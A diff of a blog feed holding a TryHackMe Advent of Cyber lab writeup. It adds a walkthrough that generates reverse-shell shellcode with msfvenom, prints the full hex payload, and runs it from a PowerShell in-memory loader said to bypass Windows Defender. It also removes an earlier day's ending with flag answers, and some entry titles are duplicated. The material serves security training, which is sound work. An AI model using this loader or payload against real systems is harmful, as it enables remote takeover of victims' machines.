-<p>Mayor Malware leaned back, tapping his fingers thoughtfully on the table. All of this research had revealed an unsettling truth: his malware, as cunning as it was, wasn’t yet ready for the wild. There were too many tools and too many vigilant eyes—analysts armed with YARA rules, Sysmon, and a host of detection techniques that could expose his creation before it even had a chance to spread.</p>
+<p>AttackBox Terminal</p>
 
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1730728611995.png" alt="Yeti playing in a sandbox" /> \n</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">attackbox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">x64</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=</span><span class="nx">ATTACKBOX_IP</span> <span class="nx">LPORT</span><span class="o">=</span><span class="mi">1111</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">powershell</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">No</span> <span class="nx">platform</span> <span class="nx">was</span> <span class="nx">selected</span><span class="p">,</span> <span class="nx">choosing</span> <span class="nx">Msf</span><span class="p">::</span><span class="nx">Module</span><span class="p">::</span><span class="nx">Platform</span><span class="p">::</span><span class="nx">Windows</span> <span class="k">from</span> <span class="nx">the</span> <span class="nx">payload</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">No</span> <span class="nx">arch</span> <span class="nx">selected</span><span class="p">,</span> <span class="nx">selecting</span> <span class="nx">arch</span><span class="p">:</span> <span class="nx">x64</span> <span class="k">from</span> <span class="nx">the</span> <span class="nx">payload</span>
+<span class="nx">No</span> <span class="nx">encoder</span> <span class="nx">specified</span><span class="p">,</span> <span class="nx">outputting</span> <span class="nx">raw</span> <span class="nx">payload</span>
+<span class="nx">Payload</span> <span class="nx">size</span><span class="p">:</span> <span class="mi">460</span> <span class="nx">bytes</span>
+<span class="nx">Final</span> <span class="nx">size</span> <span class="k">of</span> <span class="nx">powershell</span> <span class="nx">file</span><span class="p">:</span> <span class="mi">2259</span> <span class="nx">bytes</span>
+<span class="p">[</span><span class="nx">Byte</span><span class="p">[]]</span> <span class="nx">$buf</span> <span class="o">=</span> <span class="mh">0xfc</span><span class="p">,</span><span class="mh">0xe8</span><span class="p">,</span><span class="mh">0x82</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xe5</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xc0</span><span class="p">,</span><span class="mh">0x64</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span>
+<span class="mh">0x30</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0xc</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0x14</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="mh">0xf</span><span class="p">,</span><span class="mh">0xb7</span><span class="p">,</span><span class="mh">0x4a</span><span class="p">,</span><span class="mh">0x26</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xac</span><span class="p">,</span>
+<span class="mh">0x3c</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x7c</span><span class="p">,</span><span class="mh">0x2</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0xc1</span><span class="p">,</span><span class="mh">0xcf</span><span class="p">,</span><span class="mh">0xd</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xc7</span><span class="p">,</span><span class="mh">0xe2</span><span class="p">,</span><span class="mh">0xf2</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span>
+<span class="mh">0x10</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x4a</span><span class="p">,</span><span class="mh">0x3c</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd1</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span>
+<span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x3a</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd6</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xac</span><span class="p">,</span>
+<span class="mh">0xc1</span><span class="p">,</span><span class="mh">0xcf</span><span class="p">,</span><span class="mh">0xd</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xc7</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0xe0</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0xf6</span><span class="p">,</span><span class="mh">0x3</span><span class="p">,</span><span class="mh">0x7d</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">,</span><span class="mh">0x3b</span><span class="p">,</span><span class="mh">0x7d</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span>
+<span class="mh">0xe4</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0xc</span><span class="p">,</span><span class="mh">0x4b</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span>
+<span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x4</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd0</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x5b</span><span class="p">,</span><span class="mh">0x5b</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span>
+<span class="mh">0xe0</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0xeb</span><span class="p">,</span><span class="mh">0x8d</span><span class="p">,</span><span class="mh">0x5d</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x8d</span><span class="p">,</span><span class="mh">0x85</span><span class="p">,</span><span class="mh">0xb2</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span>
+<span class="mh">0x0</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x87</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd5</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span><span class="mh">0xf0</span><span class="p">,</span><span class="mh">0xb5</span><span class="p">,</span><span class="mh">0xa2</span><span class="p">,</span><span class="mh">0x56</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span>
+<span class="mh">0xa6</span><span class="p">,</span><span class="mh">0x95</span><span class="p">,</span><span class="mh">0xbd</span><span class="p">,</span><span class="mh">0x9d</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd5</span><span class="p">,</span><span class="mh">0x3c</span><span class="p">,</span><span class="mh">0x6</span><span class="p">,</span><span class="mh">0x7c</span><span class="p">,</span><span class="mh">0xa</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0xfb</span><span class="p">,</span><span class="mh">0xe0</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0x5</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span>
+<span class="mh">0x47</span><span class="p">,</span><span class="mh">0x13</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd5</span><span class="p">,</span><span class="mh">0x63</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0x63</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x0</span>
+</code></pre></div></div>
 
-<p>He clenched his fist, a determined glint in his eye. <em>“Just a little more fine-tuning,”</em> he murmured. He would study, adapt, and evolve his malware until it was truly undetectable. When the time was right, he would unleash it upon the unsuspecting SOC teams, striking when they least expected it.</p>
+<p>The above command generates a piece of shellcode using <code class="language-plaintext highlighter-rouge">msfvenom</code>. Here’s what each part means:</p>
 
-<p>But for now, he would wait. Watching. Planning. And he was perfecting his craft in the shadows.</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-p windows/x64/shell_reverse_tcp</code>: The <code class="language-plaintext highlighter-rouge">-p</code> flag tells <code class="language-plaintext highlighter-rouge">msfvenom</code> what type of payload to create. <code class="language-plaintext highlighter-rouge">windows/x64/shell_reverse_tcp</code> specifies that we want a reverse shell for a Windows machine.</li>
+  <li><code class="language-plaintext highlighter-rouge">LHOST=ATTACKBOX_IP</code>: This is the IP address of the AttackBox. It tells the reverse shell where to connect back to.</li>
+  <li><code class="language-plaintext highlighter-rouge">LPORT=1111</code>: This is the port number on your machine that will listen for the reverse shell connection. When the target connects back to you, it will use this port (<code class="language-plaintext highlighter-rouge">1111</code> in this example). You can choose any available port, but it needs to match with what your listener is set to.</li>
+  <li><code class="language-plaintext highlighter-rouge">-f powershell</code>: This specifies the format for the output. In this case, we want the payload to be in PowerShell format so it can be executed as a script on a Windows machine. \n</li>
+</ul>
 
-<h2 id="answer-the-questions-below">Answer the questions below</h2>
+<p><strong>Where Is the Actual Shellcode</strong></p>
 
-<p>What is the flag displayed in the popup window after the EDR detects the malware?</p>
+<p>The actual shellcode in the output above is the hex-encoded byte array, which starts with <code class="language-plaintext highlighter-rouge">0xfc, 0xe8, 0x82</code>, and so on. The hexadecimal numbers represent the instructions set on the target machine. Computers understand binary (1s and 0s), but hex numbers are just a more human-readable version. So, instead of seeing long strings of 1s and 0s, you see something like <code class="language-plaintext highlighter-rouge">0xfc</code> instead. \n</p>
 
-<p>THM{GlitchWasHere}</p>
+<p>We can execute this shellcode by loading it into memory and then creating a thread for its execution. In this case, we will use PowerShell to call a few Windows APIs via C# code. Below is a simple PowerShell script that will execute our shellcode:</p>
 
-<p>What is the flag found in the malstrings.txt document after running floss.exe, and opening the file in a text editor?</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nx">$VrtAlloc</span> <span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
+using System;
+using System.Runtime.InteropServices;
 
-<p>THM{HiddenClue}</p>
+public class VrtAlloc{
+    [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="dl">"</span><span class="s2">)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+}
+</span><span class="dl">"</span><span class="p">@</span>
 
-<p>If you want to more about sandboxes, have a look at the room <a href="https://tryhackme.com/r/room/flarevmarsenaloftools">FlareVM: Arsenal of Tools</a>.</p>]]></content><author><name>Michael</name></author></entry><entry><title type="html">Try Hackme Advent of Cyber - Day 7</title><link href="http://localhost:4000/Day7" rel="alternate" type="text/html" title="Try Hackme Advent of Cyber - Day 7" /><published>2024-12-07T00:00:00-05:00</published><updated>2024-12-07T00:00:00-05:00</updated><id>http://localhost:4000/Day7</id><content type="html" xml:base="http://localhost:4000/Day7"><![CDATA[<p>|  <img src="https://mail.google.com/mail/u/0/images/cleardot.gif" alt="" /> |
+<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$VrtAlloc</span>
+
+<span class="nx">$WaitFor</span><span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
+using System;
+using System.Runtime.InteropServices;
+
+public class WaitFor{
+ [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="p">.</span><span class="nx">dll</span><span class="dl">"</span><span class="s2">, SetLastError=true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+}
+</span><span class="dl">"</span><span class="p">@</span>
+
+<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$WaitFor</span>
+
+<span class="nx">$CrtThread</span><span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
+using System;
+using System.Runtime.InteropServices;
+
+public class CrtThread{
+ [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="dl">"</span><span class="s2">, CharSet=CharSet.Ansi)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+}
+</span><span class="dl">"</span><span class="p">@</span>
+<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$CrtThread</span>
+
+<span class="p">[</span><span class="nx">Byte</span><span class="p">[]]</span> <span class="nx">$buf</span> <span class="o">=</span> <span class="nx">SHELLCODE_PLACEHOLDER</span>
+<span class="p">[</span><span class="nx">IntPtr</span><span class="p">]</span><span class="nx">$addr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">VrtAlloc</span><span class="p">]::</span><span class="nc">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">$buf</span><span class="p">.</span><span class="nx">Length</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
+<span class="p">[</span><span class="nx">System</span><span class="p">.</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">InteropServices</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">]::</span><span class="nc">Copy</span><span class="p">(</span><span class="nx">$buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$addr</span><span class="p">,</span> <span class="nx">$buf</span><span class="p">.</span><span class="nx">Length</span><span class="p">)</span>
+<span class="nx">$thandle</span> <span class="o">=</span> <span class="p">[</span><span class="nx">CrtThread</span><span class="p">]::</span><span class="nc">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="p">[</span><span class="nx">WaitFor</span><span class="p">]::</span><span class="nc">WaitForSingleObject</span><span class="p">(</span><span class="nx">$thandle</span><span class="p">,</span> <span class="p">[</span><span class="nx">uint32</span><span class="p">]</span><span class="dl">"</span><span class="s2">0xFFFFFFFF</span><span class="dl">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><em>Phew!</em> That’s a lot of code. But don’t stress. We’ll break down what it does step by step.</p>
+
+<p>If you’re new to cyber security, memorising these functions is unnecessary. Most penetration testers use pre-made or automated tools to run shellcode, so you don’t have to know every technical detail to complete the job. No need to worry! \n</p>
+
+<p><strong>Explanation of the Code</strong></p>
+
+<p>The script starts by defining a few C# classes. These classes use the <code class="language-plaintext highlighter-rouge">DllImport</code> attribute to load specific functions from the <code class="language-plaintext highlighter-rouge">kernel32</code> DLL, which is part of the Windows API. \n</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">VirtualAlloc</code>: This function allocates memory in the process’s address space. It’s commonly used in scenarios like this to prepare memory for storing and executing shellcode.</li>
+  <li><code class="language-plaintext highlighter-rouge">CreateThread</code>: This function creates a new thread in the process. The thread will execute the shellcode that has been loaded into memory.</li>
+  <li><code class="language-plaintext highlighter-rouge">WaitForSingleObject</code>: This function pauses execution until a specific thread finishes its task. In this case, it ensures that the shellcode has completed execution.</li>
+</ul>
+
+<p>These classes are then added to PowerShell using the <code class="language-plaintext highlighter-rouge">Add-Type</code> command, allowing PowerShell to use these functions.</p>
+
+<p><strong>Storing the Shellcode in a Byte Array</strong></p>
+
+<p>Next, the script stores the shellcode in the <code class="language-plaintext highlighter-rouge">$buf</code> variable, a byte array. In the example above, <code class="language-plaintext highlighter-rouge">SHELLCODE_PLACEHOLDER</code> is just there to show where you would insert the actual shellcode earlier generated through <code class="language-plaintext highlighter-rouge">msfvenom</code>. Usually, you’d replace it with the real shellcode, represented as a series of hexadecimal values. These hex values are the instructions that will be executed when the shellcode runs.</p>
+
+<p><strong>Allocating Memory for the Shellcode</strong></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> function then allocates a block of memory where the shellcode will be stored. The script uses the following arguments:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">0</code> for the memory address, meaning that Windows will decide where to allocate the memory.</li>
+  <li><code class="language-plaintext highlighter-rouge">$size</code> for the size of the memory block, which is determined by the length of the shellcode.</li>
+  <li><code class="language-plaintext highlighter-rouge">0x3000</code> for the allocation type, which tells Windows to reserve and commit the memory.</li>
+  <li><code class="language-plaintext highlighter-rouge">0x40</code> for memory protection, the memory is readable and executable (necessary for executing shellcode).</li>
+</ul>
+
+<p>After memory is allocated, the <code class="language-plaintext highlighter-rouge">Marshal.Copy</code> function copies the shellcode from the <code class="language-plaintext highlighter-rouge">$buf</code> array into the allocated memory address (<code class="language-plaintext highlighter-rouge">$addr</code>), preparing it for execution.</p>
+
+<p><strong>Executing the Shellcode and Waiting for Completion</strong></p>
+
+<p>Once the shellcode is stored in memory, the script calls the <code class="language-plaintext highlighter-rouge">CreateThread</code> function to execute the shellcode by creating a new thread. This thread is instructed to start execution from the memory address where the shellcode is located (<code class="language-plaintext highlighter-rouge">$addr</code>). The script then uses the <code class="language-plaintext highlighter-rouge">WaitForSingleObject</code> function, ensuring it waits for the shellcode execution to finish before continuing. This makes sure that the shellcode runs completely before the script ends its execution.</p>
+
+<h2 id="time-for-some-action---executing-the-shellcode">Time for Some Action - Executing the Shellcode</h2>
+
+<p>On the AttackBox, execute the command <code class="language-plaintext highlighter-rouge">nc -nvlp 1111</code> to start a listener on port <code class="language-plaintext highlighter-rouge">1111</code> and wait for an incoming connection. This command opens port <code class="language-plaintext highlighter-rouge">1111</code> and listens for connections, allowing the AttackBox to receive data once a connection is made.</p>
+
+<p>AttackBox Terminal</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">root</span><span class="p">@</span><span class="nd">attackbox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">nvlp</span> <span class="mi">1111</span>
+<span class="nx">Listening</span> <span class="nx">on</span> <span class="p">[</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">]</span> <span class="p">(</span><span class="nx">family</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">port</span> <span class="mi">1111</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>On the AttackBox, begin by navigating to the Desktop. Right-click on the <code class="language-plaintext highlighter-rouge">Desktop</code>, select <code class="language-plaintext highlighter-rouge">Create Document</code>, and then choose <code class="language-plaintext highlighter-rouge">Empty File</code>. Open this new file and paste the previously provided PowerShell script code into it. Look for the part labelled <code class="language-plaintext highlighter-rouge">SHELLCODE_PLACEHOLDER</code> and replace it with the shell code we previously created with <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732683410058.png" alt="creating new file sand saving shellcode" /> \n</p>
+
+<p>Once you’ve added the shellcode navigate to the attached VM, open PowerShell by clicking the PowerShell icon on the taskbar and paste parts of the code from the document you recently created to the Windows PowerShell window. For example, the first part to copy and paste is the block below:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$VrtAlloc</span> <span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
+using System;
+using System.Runtime.InteropServices;
+
+public class VrtAlloc{
+    [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="dl">"</span><span class="s2">)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+}
+</span><span class="dl">"</span><span class="p">@</span>
+
+<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$VrtAlloc</span>
+
+<span class="nx">$WaitFor</span><span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
+using System;
+using System.Runtime.InteropServices;
+
+public class WaitFor{
+ [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="p">.</span><span class="nx">dll</span><span class="dl">"</span><span class="s2">, SetLastError=true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+}
+</span><span class="dl">"</span><span class="p">@</span>
+
+<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$WaitFor</span>
+
+<span class="nx">$CrtThread</span><span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
+using System;
+using System.Runtime.InteropServices;
+
+public class CrtThread{
+ [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="dl">"</span><span class="s2">, CharSet=CharSet.Ansi)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+}
+</span><span class="dl">"</span><span class="p">@</span>
+<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$CrtThread</span>
+</code></pre></div></div>
+
+<p>Then paste the line below, replacing the placeholder with the shellcode generated by msfvenom, and press <code class="language-plaintext highlighter-rouge">Enter</code>.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nx">Byte</span><span class="p">[]]</span> <span class="nx">$buf</span> <span class="o">=</span> <span class="nx">SHELLCODE_PLACEHOLDER</span>
+</code></pre></div></div>
+
+<p>Continue copying and pasting the lines from the code below. Remember, copy one line at a time, paste it, and press <code class="language-plaintext highlighter-rouge">Enter</code>.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nx">IntPtr</span><span class="p">]</span><span class="nx">$addr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">VrtAlloc</span><span class="p">]::</span><span class="nc">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">$buf</span><span class="p">.</span><span class="nx">Length</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
+<span class="p">[</span><span class="nx">System</span><span class="p">.</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">InteropServices</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">]::</span><span class="nc">Copy</span><span class="p">(</span><span class="nx">$buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$addr</span><span class="p">,</span> <span class="nx">$buf</span><span class="p">.</span><span class="nx">Length</span><span class="p">)</span>
+<span class="nx">$thandle</span> <span class="o">=</span> <span class="p">[</span><span class="nx">CrtThread</span><span class="p">]::</span><span class="nc">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="p">[</span><span class="nx">WaitFor</span><span class="p">]::</span><span class="nc">WaitForSingleObject</span><span class="p">(</span><span class="nx">$thandle</span><span class="p">,</span> <span class="p">[</span><span class="nx">uint32</span><span class="p">]</span><span class="dl">"</span><span class="s2">0xFFFFFFFF</span><span class="dl">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>If you’ve done it properly, the PowerShell terminal in the VM will look like the screenshot below:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732698537726.png" alt="PowerShell screenshot after executing the script" /> \n</p>
+
+<p>Once you execute the final line in the PowerShell terminal and press <code class="language-plaintext highlighter-rouge">Enter</code>, you will get a reverse shell in the AttackBox, giving you complete access to the computer even if the Windows Defender is enabled. Now you can issue any command, like issuing <code class="language-plaintext highlighter-rouge">dir</code>, which will list all the directories.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1727972837925.png" alt="successful shell screenshot" /></p>
+
+<h2 id="regaining-access">Regaining Access</h2>
+
+<p><em>Now Glitch must act, no time to delay,</em></p>
+
+<p><em>To fix the shellcode and keep foes at bay.</em></p>
+
+<p><em>He tweaks and he codes to set the wrongs right,</em></p>
+
+<p><em>Protecting his secrets with all of his might.</em></p>
+
+<ul>
+  <li>\n *</li>
+</ul>
+
+<p>Let’s dive into the story and troubleshoot the issue in this part of the task. Glitch has realised he’s no longer receiving incoming connections from his home base. Mayor Malware’s minion team seems to have tampered with the shellcode and updated both the IP and port, preventing Glitch from connecting. The correct IP address for Glitch is <code class="language-plaintext highlighter-rouge">ATTACKBOX_IP</code>, and the successful connection port should be <code class="language-plaintext highlighter-rouge">4444</code>.</p>
+
+<p>Can you help Glitch identify and update the shellcode with the correct IP and port to restore the connection and reclaim control?</p>
+
+<p>Answer the questions below</p>
+
+<p>What is the flag value once Glitch gets reverse shell on the digital vault using port 4444? Note: The flag may take around a minute to appear in the <strong>C:\Users\glitch\Desktop</strong> directory. You can view the content of the flag by using the command <strong>type C:\Users\glitch\Desktop\flag.txt</strong>.</p>
+
+<p>Are you interested in learning more about evasion? Take a look at the <a href="https://tryhackme.com/r/room/avevasionshellcode">AV Evasion: Shellcode</a> room.</p>]]></content><author><name>Michael</name></author><category term="documentation" /><category term="documentation" /><category term="AoC" /><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day8-logo.png" /><media:content medium="image" url="http://localhost:4000/Day8-logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Try Hackme Advent of Cyber - Day 7</title><link href="http://localhost:4000/Day7" rel="alternate" type="text/html" title="Try Hackme Advent of Cyber - Day 7" /><published>2024-12-07T00:00:00-05:00</published><updated>2024-12-07T00:00:00-05:00</updated><id>http://localhost:4000/Day7</id><content type="html" xml:base="http://localhost:4000/Day7"><![CDATA[<p>|  <img src="https://mail.google.com/mail/u/0/images/cleardot.gif" alt="" /> |
 |—-|</p>
 
